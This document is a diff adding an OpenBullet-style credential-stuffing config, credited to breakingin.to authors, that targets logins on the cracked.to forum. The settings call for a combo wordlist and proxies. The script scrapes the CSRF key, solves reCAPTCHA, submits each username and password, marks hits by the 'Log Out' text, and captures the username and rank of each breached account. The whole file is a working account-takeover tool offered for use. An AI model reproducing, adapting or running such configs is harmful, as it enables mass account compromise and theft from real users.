@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "CrackedTo BreakingIn.To",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-12T03:00:00.6834623-07:00",
+  "AdditionalInfo": "Check Out BreakingIn.To",
+  "Author": "NALON & SWAT - breakingin.to",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#IDK REQUEST GET "https://cracked.to/member.php?action=login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#keycto PARSE "<SOURCE>" LR "name=\"my_post_key\" type=\"hidden\" value=\"" "\" />" -> VAR "keycto" 
+
+#capt RECAPTCHA "https://cracked.to/member.php?action=login" "6LemfFcUAAAAAGRkDd8m31QngNxrjj5LfoxlfdIJ" -> VAR "capt" 
+
+#LOGIN REQUEST POST "https://cracked.to/member.php?action=login" 
+  CONTENT "username=<USER>&password=<PASS>&g-recaptcha-response=<capt>&action=do_login&url=&my_post_key=<keycto>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Log Out" 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an invalid username/password combination." 
+    KEY "If you have forgotten your password please retrieve a new one." 
+
+#Username PARSE "<SOURCE>" LR "\" class=\"drop-menu-username\">" "</a>" CreateEmpty=FALSE -> CAP "Username" 
+
+#Rank PARSE "<SOURCE>" LR "href=\"https://cracked.to/<Username>\"><span class=\"" "\"><Username></span>" CreateEmpty=FALSE -> CAP "Rank" 
+
